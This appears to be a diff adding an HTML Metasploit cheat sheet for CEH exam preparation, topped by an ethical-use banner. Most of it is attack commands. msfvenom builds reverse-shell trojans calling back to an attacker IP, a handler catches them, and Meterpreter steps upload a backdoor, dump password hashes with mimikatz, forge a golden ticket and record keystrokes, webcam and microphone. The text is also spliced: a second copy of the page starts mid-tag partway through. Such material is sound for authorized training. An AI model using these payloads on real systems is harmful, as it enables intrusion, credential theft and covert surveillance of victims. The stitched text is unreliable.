+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Use existing executable as template</span><br>
+                        <span class="command">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -x /path/to/template.exe -f exe > trojan.exe</span><br><br>
+                        <span class="comment"># Multiple encoding iterations</span><br>
+                        <span class="command">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe</span><br><br>
+                        <span class="comment"># List available encoders</span><br>
+                        <span class="command">msfvenom --list encoders</span><br><br>
+                        <span class="comment"># List payload formats</span><br>
+                        <span class="command">msfvenom --list formats</span><br><br>
+                        <span class="comment"># Bad character avoidance</span><br>
+                        <span class="command">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -b '\x00\x0a\x0d' -f exe > nobadchars.exe</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tool-category">
+                <h3>🎧 Setting up Listeners</h3>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Multi/Handler Setup</span>
+                        <span class="tag">Listeners</span>
+                    </div>
+                    <div class="tool-description">
+                        Configure listeners to catch reverse connections from your generated payloads.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Setup basic listener</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use multi/handler</span><br>
+                        <span class="msf-prompt">msf6 exploit(multi/handler) ></span> <span class="command">set payload windows/meterpreter/reverse_tcp</span><br>
+                        <span class="msf-prompt">msf6 exploit(multi/handler) ></span> <span class="command">set LHOST 192.168.1.10</span><br>
+                        <span class="msf-prompt">msf6 exploit(multi/handler) ></span> <span class="command">set LPORT 4444</span><br>
+                        <span class="msf-prompt">msf6 exploit(multi/handler) ></span> <span class="command">exploit -j</span><br><br>
+                        <span class="comment"># Multiple listeners for different payloads</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use multi/handler</span><br>
+                        <span class="msf-prompt">msf6 exploit(multi/handler) ></span> <span class="command">set payload linux/x64/meterpreter/reverse_tcp</span><br>
+                        <span class="msf-prompt">msf6 exploit(multi/handler) ></span> <span class="command">set LHOST 192.168.1.10</span><br>
+                        <span class="msf-prompt">msf6 exploit(multi/handler) ></span> <span class="command">set LPORT 5555</span><br>
+                        <span class="msf-prompt">msf6 exploit(multi/handler) ></span> <span class="command">exploit -j</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="meterpreter" class="section">
+            <h2>🚀 Meterpreter Mastery</h2>
+            <p>Comprehensive guide to Meterpreter commands and post-exploitation capabilities.</p>
+
+            <div class="tool-category">
+                <h3>ℹ️ Basic Information Gathering</h3>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>System Information</span>
+                        <span class="tag">Reconnaissance</span>
+                    </div>
+                    <div class="tool-description">
+                        Gather essential information about the compromised system for situational awareness.
+                    </div>
+                    <div class="code-block meterpreter-block">
+                        <span class="comment"># Basic system information</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">sysinfo</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">getuid</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">getpid</span><br><br>
+                        <span class="comment"># Network information</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">ipconfig</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">route</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">arp</span><br><br>
+                        <span class="comment"># Process information</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">ps</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">getprivs</span><br><br>
+                        <span class="comment"># Environment details</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">pwd</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">getenv</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>File System Operations</span>
+                        <span class="tag">File Management</span>
+                    </div>
+                    <div class="tool-description">
+                        Navigate and manipulate the file system on the compromised target.
+                    </div>
+                    <div class="code-block meterpreter-block">
+                        <span class="comment"># Directory operations</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">ls</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">dir</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">cd C:\Users\Administrator</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">mkdir backdoor</span><br><br>
+                        <span class="comment"># File operations</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">download C:\important\data.txt /tmp/</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">upload /tmp/backdoor.exe C:\temp\</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">cat C:\important\passwords.txt</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">edit C:\temp\config.txt</span><br><br>
+                        <span class="comment"># File search</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">search -f *.pdf</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">search -d C:\Users -f password*</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Process Management</span>
+                        <span class="tag">Processes</span>
+                    </div>
+                    <div class="tool-description">
+                        Manage processes for stealth, privilege escalation, and persistence.
+                    </div>
+                    <div class="code-block meterpreter-block">
+                        <span class="comment"># Process migration</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">ps</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">migrate 1234</span><br><br>
+                        <span class="comment"># Kill processes</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">kill 5678</span><br><br>
+                        <span class="comment"># Execute commands</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">execute -f cmd.exe -i</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">execute -f notepad.exe</span><br><br>
+                        <span class="comment"># Shell access</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">shell</span><br>
+                        <span class="output">C:\></span> <span class="command">exit</span><br><br>
+                        <span class="comment"># Get system shell (if admin)</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">getsystem</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tool-category">
+                <h3>🔒 Credential Harvesting</h3>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Password Dumping</span>
+                        <span class="tag">Credentials</span>
+                    </div>
+                    <div class="tool-description">
+                        Extract passwords and hashes from the compromised system's memory and registry.
+                    </div>
+                    <div class="code-block meterpreter-block">
+                        <span class="comment"># Dump password hashes</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">hashdump</span><br><br>
+                        <span class="comment"># Load and use mimikatz</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">load mimikatz</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">mimikatz_command -f samdump::hashes</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">mimikatz_command -f sekurlsa::logonpasswords</span><br><br>
+                        <span class="comment"># Alternative: Load kiwi extension</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">load kiwi</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">creds_all</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">creds_wdigest</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">creds_msv</span><br><br>
+                        <span class="comment"># Golden ticket creation</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">golden_ticket_create -d domain.local -k krbtgt_hash -s domain_sid -u administrator</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Keylogging and Screenshots</span>
+                        <span class="tag">Surveillance</span>
+                    </div>
+                    <div class="tool-description">
+                        Monitor user activity through keylogging and screen capture capabilities.
+                    </div>
+                    <div class="code-block meterpreter-block">
+                        <span class="comment"># Keylogger operations</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">keyscan_start</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">keyscan_dump</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">keyscan_stop</span><br><br>
+                        <span class="comment"># Screenshot capabilities</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">screenshot</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">screenshot -v false</span><br><br>
+                        <span class="comment"># Webcam operations</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">webcam_list</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">webcam_snap</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">webcam_stream</span><br><br>
+                        <span class="comment"># Record audio</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">record_mic</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tool-category">
+                <h3>🌐 Network Operations</h3>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Network Discovery</span>
+                        <span class="tag">Network</span>
+                    </div>
+                    <div class="tool-description">
+                        Discover network topology and identify additional targets from the compromised host.
+                    </div>
+                    <div class="code-block m<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit Mastery - Workspaces & Meterpreter</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #e0e0e0;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 50px 0;
+            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 50%, #8e44ad 100%);
+            border-radius: 25px;
+            box-shadow: 0 25px 50px rgba(231, 76, 60, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            animation: pulse 4s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1) rotate(0deg); opacity: 0.5; }
+            50% { transform: scale(1.1) rotate(180deg); opacity: 0.8; }
+        }
+
+        .header h1 {
+            font-size: 3.5em;
+            margin-bottom: 15px;
+            text-shadow: 3px 3px 6px rgba(0,0,0,0.5);
+            position: relative;
+            z-index: 1;
+        }
+
+        .header p {
+            font-size: 1.3em;
+            opacity: 0.95;
+            position: relative;
+            z-index: 1;
+        }
+
+        .nav {
+            position: sticky;
+            top: 20px;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(20px);
+            padding: 25px;
+            border-radius: 20px;
+            margin-bottom: 40px;
+            border: 2px solid rgba(231, 76, 60, 0.3);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+            z-index: 100;
+        }
+
+        .nav ul {
+            list-style: none;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            justify-items: center;
+        }
+
+        .nav a {
+            color: #e74c3c;
+            text-decoration: none;
+            padding: 12px 20px;
+            border-radius: 25px;
+            background: rgba(231, 76, 60, 0.1);
+            transition: all 0.3s ease;
+            border: 2px solid rgba(231, 76, 60, 0.3);
+            font-weight: 600;
+            display: block;
+            text-align: center;
+        }
+
+        .nav a:hover {
+            background: rgba(231, 76, 60, 0.3);
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 8px 25px rgba(231, 76, 60, 0.4);
+            border-color: #e74c3c;
+        }
+
+        .nav a.active {
+            background: rgba(231, 76, 60, 0.4);
+            border-color: #e74c3c;
+            color: #ffffff;
+            box-shadow: 0 8px 25px rgba(231, 76, 60, 0.6);
+        }
+
+        .section {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(15px);
+            border-radius: 20px;
+            padding: 40px;
+            margin-bottom: 40px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 15px 45px rgba(0,0,0,0.3);
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(231, 76, 60, 0.1), transparent);
+            transition: left 0.8s ease;
+        }
+
+        .section:hover::before {
+            left: 100%;
+        }
+
+        .section:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 25px 60px rgba(0,0,0,0.4);
+            border-color: rgba(231, 76, 60, 0.3);
+        }
+
+        .section h2 {
+            color: #e74c3c;
+            font-size: 2.5em;
+            margin-bottom: 25px;
+            border-bottom: 4px solid #e74c3c;
+            padding-bottom: 15px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .section h3 {
+            color: #f39c12;
+            font-size: 1.8em;
+            margin: 30px 0 20px 0;
+            position: relative;
+            z-index: 1;
+        }
+
+        .tool-category {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 30px 0;
+            border-left: 5px solid #e74c3c;
+            position: relative;
+        }
+
+        .tool-item {
+            background: rgba(231, 76, 60, 0.05);
+            border: 1px solid rgba(231, 76, 60, 0.2);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .tool-item:hover {
+            background: rgba(231, 76, 60, 0.1);
+            border-color: rgba(231, 76, 60, 0.4);
+            transform: translateX(10px);
+        }
+
+        .tool-item:active {
+            transform: translateX(15px) scale(0.98);
+        }
+
+        .tool-name {
+            color: #64ffda;
+            font-size: 1.4em;
+            font-weight: bold;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .tool-description {
+            color: #b0b0b0;
+            margin-bottom: 15px;
+            line-height: 1.7;
+        }
+
+        .code-block {
+            background: linear-gradient(135deg, #0d1117 0%, #1a1b23 100%);
+            border: 2px solid #e74c3c;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+            font-family: 'Courier New', monospace;
+            color: #58a6ff;
+            overflow-x: auto;
+            position: relative;
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.3);
+        }
+
+        .code-block::before {
+            content: '🎯 MSF Console';
+            position: absolute;
+            top: -12px;
+            left: 20px;
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 8px;
+            font-size: 0.9em;
+            font-weight: bold;
+            box-shadow: 0 4px 15px rgba(231, 76, 60, 0.3);
+        }
+
+        .meterpreter-block::before {
+            content: '🚀 Meterpreter';
+            background: linear-gradient(135deg, #8e44ad, #9b59b6);
+        }
+
+        .command {
+            color: #7dd3fc;
+            font-weight: bold;
+        }
+
+        .output {
+            color: #34d399;
+        }
+
+        .comment {
+            color: #8b949e;
+            font-style: italic;
+        }
+
+        .msf-prompt {
+            color: #e74c3c;
+            font-weight: bold;
+        }
+
+        .meterpreter-prompt {
+            color: #8e44ad;
+            font-weight: bold;
+        }
+
+        .warning {
+            background: linear-gradient(135deg, #fbbf24, #f59e0b);
+            color: #1f2937;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 25px 0;
+            font-weight: bold;
+            box-shadow: 0 8px 25px rgba(251, 191, 36, 0.3);
+            border-left: 5px solid #d97706;
+        }
+
+        .info {
+            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 25px 0;
+            box-shadow: 0 8px 25px rgba(59, 130, 246, 0.3);
+            border-left: 5px solid #1e40af;
+        }
+
+        .success {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 25px 0;
+            box-shadow: 0 8px 25px rgba(16, 185, 129, 0.3);
+            border-left: 5px solid #047857;
+        }
+
+        .step {
+            background: rgba(231, 76, 60, 0.1);
+            border-left: 5px solid #e74c3c;
+            padding: 25px;
+            margin: 25px 0;
+            border-radius: 0 15px 15px 0;
+            position: relative;
+        }
+
+        .step-number {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: white;
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-right: 15px;
+            box-shadow: 0 4px 15px rgba(231, 76, 60, 0.3);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+            background: rgba(0,0,0,0.4);
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+
+        th, td {
+            padding: 18px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        th {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: white;
+            font-weight: bold;
+            font-size: 1.1em;
+        }
+
+        tr:hover {
+            background: rgba(231, 76, 60, 0.1);
+            transform: scale(1.02);
+            transition: all 0.2s ease;
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+
+        .feature-card {
+            background: rgba(231, 76, 60, 0.05);
+            border: 2px solid rgba(231, 76, 60, 0.2);
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .feature-card:hover {
+            background: rgba(231, 76, 60, 0.1);
+            border-color: #e74c3c;
+            transform: translateY(-5px) scale(1.02);
+            box-shadow: 0 15px 30px rgba(231, 76, 60, 0.2);
+        }
+
+        .feature-icon {
+            font-size: 3em;
+            margin-bottom: 15px;
+        }
+
+        .tag {
+            display: inline-block;
+            background: rgba(100, 255, 218, 0.2);
+            color: #64ffda;
+            padding: 4px 10px;
+            border-radius: 15px;
+            font-size: 0.8em;
+            font-weight: bold;
+            margin: 2px;
+            border: 1px solid rgba(100, 255, 218, 0.3);
+        }
+
+        .highlight {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: white;
+            padding: 3px 8px;
+            border-radius: 6px;
+            font-weight: bold;
+        }
+
+        .back-to-top {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 1.2em;
+            box-shadow: 0 4px 15px rgba(231, 76, 60, 0.3);
+            opacity: 0;
+            transform: translateY(100px);
+            transition: all 0.3s ease;
+            z-index: 1000;
+        }
+
+        .back-to-top.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .back-to-top:hover {
+            transform: translateY(-5px) scale(1.1);
+            box-shadow: 0 8px 25px rgba(231, 76, 60, 0.5);
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            .header h1 {
+                font-size: 2.5em;
+            }
+            
+            .nav ul {
+                grid-template-columns: 1fr;
+            }
+            
+            .section {
+                padding: 25px;
+            }
+            
+            .code-block {
+                font-size: 0.9em;
+                padding: 20px;
+            }
+
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎯 Metasploit Mastery</h1>
+            <p>Complete Guide to Workspaces & Meterpreter for CEH Practical</p>
+        </div>
+
+        <nav class="nav">
+            <ul>
+                <li><a href="#intro">Introduction</a></li>
+                <li><a href="#workspaces">Workspaces</a></li>
+                <li><a href="#basic-commands">Basic Commands</a></li>
+                <li><a href="#payloads">Payloads</a></li>
+                <li><a href="#meterpreter">Meterpreter</a></li>
+                <li><a href="#post-exploitation">Post-Exploitation</a></li>
+                <li><a href="#persistence">Persistence</a></li>
+                <li><a href="#pivoting">Pivoting</a></li>
+                <li><a href="#reference">Quick Reference</a></li>
+            </ul>
+        </nav>
+
+        <div class="warning">
+            ⚠️ <strong>ETHICAL USE ONLY:</strong> This guide is for authorized penetration testing and CEH practical exam preparation only. Always obtain proper written authorization before using Metasploit on any system you do not own.
+        </div>
+
+        <section id="intro" class="section">
+            <h2>🚀 Introduction to Metasploit</h2>
+            
+            <p style="font-size: 1.1em; margin-bottom: 20px;">Metasploit is the world's most used penetration testing framework, providing a comprehensive platform for developing, testing, and executing exploit code against remote targets. This guide focuses on workspace management and Meterpreter usage for the CEH practical exam.</p>
+
+            <div class="feature-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">🗂️</div>
+                    <h3>Workspaces</h3>
+                    <p>Organize and manage multiple penetration testing engagements</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🎯</div>
+                    <h3>Exploit Development</h3>
+                    <p>Comprehensive exploit database and payload generation</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🚀</div>
+                    <h3>Meterpreter</h3>
+                    <p>Advanced post-exploitation payload with extensive capabilities</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🔄</div>
+                    <h3>Pivoting</h3>
+                    <p>Route through compromised systems to reach internal networks</p>
+                </div>
+            </div>
+
+            <div class="info">
+                <h3>📋 Framework Components:</h3>
+                <p><strong>msfconsole:</strong> Main interface for interacting with the framework</p>
+                <p><strong>msfvenom:</strong> Standalone payload generator and encoder</p>
+                <p><strong>msfdb:</strong> Database management for storing engagement data</p>
+                <p><strong>Workspaces:</strong> Logical separation of different penetration testing projects</p>
+            </div>
+        </section>
+
+        <section id="workspaces" class="section">
+            <h2>🗂️ Workspace Management</h2>
+            <p>Workspaces allow you to organize different penetration testing engagements and keep data separated.</p>
+
+            <div class="tool-category">
+                <h3>📁 Basic Workspace Operations</h3>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Database Initialization</span>
+                        <span class="tag">Setup</span>
+                    </div>
+                    <div class="tool-description">
+                        Initialize the Metasploit database to enable workspace functionality and data persistence.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Initialize Metasploit database</span><br>
+                        <span class="command">sudo msfdb init</span><br><br>
+                        <span class="comment"># Start PostgreSQL service</span><br>
+                        <span class="command">sudo systemctl start postgresql</span><br><br>
+                        <span class="comment"># Check database status</span><br>
+                        <span class="command">sudo msfdb status</span><br><br>
+                        <span class="comment"># Start msfconsole with database</span><br>
+                        <span class="command">msfconsole</span><br><br>
+                        <span class="comment"># Verify database connection</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">db_status</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Creating and Managing Workspaces</span>
+                        <span class="tag">Organization</span>
+                    </div>
+                    <div class="tool-description">
+                        Create, switch between, and manage different workspaces for organized penetration testing.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># List all workspaces</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">workspace</span><br><br>
+                        <span class="comment"># Create new workspace</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">workspace -a CEH_Exam</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">workspace -a Company_Pentest</span><br><br>
+                        <span class="comment"># Switch to workspace</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">workspace CEH_Exam</span><br><br>
+                        <span class="comment"># Delete workspace</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">workspace -d old_workspace</span><br><br>
+                        <span class="comment"># Rename workspace</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">workspace -r CEH_Exam CEH_Practice</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Host and Service Discovery</span>
+                        <span class="tag">Reconnaissance</span>
+                    </div>
+                    <div class="tool-description">
+                        Use Metasploit's built-in scanning capabilities to discover hosts and services, automatically storing results in the current workspace.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Nmap integration</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">db_nmap -sS -sV 192.168.1.0/24</span><br><br>
+                        <span class="comment"># TCP port scan</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use auxiliary/scanner/portscan/tcp</span><br>
+                        <span class="msf-prompt">msf6 auxiliary(scanner/portscan/tcp) ></span> <span class="command">set RHOSTS 192.168.1.100</span><br>
+                        <span class="msf-prompt">msf6 auxiliary(scanner/portscan/tcp) ></span> <span class="command">run</span><br><br>
+                        <span class="comment"># SMB version scanning</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use auxiliary/scanner/smb/smb_version</span><br>
+                        <span class="msf-prompt">msf6 auxiliary(scanner/smb/smb_version) ></span> <span class="command">set RHOSTS 192.168.1.0/24</span><br>
+                        <span class="msf-prompt">msf6 auxiliary(scanner/smb/smb_version) ></span> <span class="command">run</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Database Queries</span>
+                        <span class="tag">Data Management</span>
+                    </div>
+                    <div class="tool-description">
+                        Query the database to view discovered hosts, services, and vulnerabilities within your workspace.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># View all hosts</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">hosts</span><br><br>
+                        <span class="comment"># View services</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">services</span><br><br>
+                        <span class="comment"># View specific host services</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">services 192.168.1.100</span><br><br>
+                        <span class="comment"># Search for specific service</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">services -S http</span><br><br>
+                        <span class="comment"># View vulnerabilities</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">vulns</span><br><br>
+                        <span class="comment"># View credentials</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">creds</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tool-category">
+                <h3>💾 Data Import/Export</h3>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Importing Scan Results</span>
+                        <span class="tag">Data Import</span>
+                    </div>
+                    <div class="tool-description">
+                        Import external scan results from Nmap, Nessus, and other tools into your workspace.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Import Nmap XML</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">db_import /path/to/nmap_scan.xml</span><br><br>
+                        <span class="comment"># Import Nessus file</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">db_import /path/to/nessus_scan.nessus</span><br><br>
+                        <span class="comment"># Import OpenVAS XML</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">db_import /path/to/openvas_report.xml</span><br><br>
+                        <span class="comment"># Import from specific workspace</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">workspace -a imported_data</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">db_import /path/to/scan_results.xml</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Exporting Data</span>
+                        <span class="tag">Reporting</span>
+                    </div>
+                    <div class="tool-description">
+                        Export workspace data for reporting and analysis in various formats.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Export all workspace data</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">db_export -f xml /path/to/export.xml</span><br><br>
+                        <span class="comment"># Export only hosts</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">db_export -f csv -t hosts /path/to/hosts.csv</span><br><br>
+                        <span class="comment"># Export services</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">db_export -f csv -t services /path/to/services.csv</span><br><br>
+                        <span class="comment"># Export credentials</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">db_export -f csv -t creds /path/to/credentials.csv</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="basic-commands" class="section">
+            <h2>⚡ Essential Metasploit Commands</h2>
+            <p>Master the fundamental commands needed for effective Metasploit usage during your CEH practical exam.</p>
+
+            <div class="tool-category">
+                <h3>🔍 Search and Module Selection</h3>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Searching for Modules</span>
+                        <span class="tag">Discovery</span>
+                    </div>
+                    <div class="tool-description">
+                        Find exploits, auxiliary modules, and payloads relevant to your target systems.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Search for specific service exploits</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">search smb</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">search http</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">search ssh</span><br><br>
+                        <span class="comment"># Search by CVE number</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">search cve:2017-0144</span><br><br>
+                        
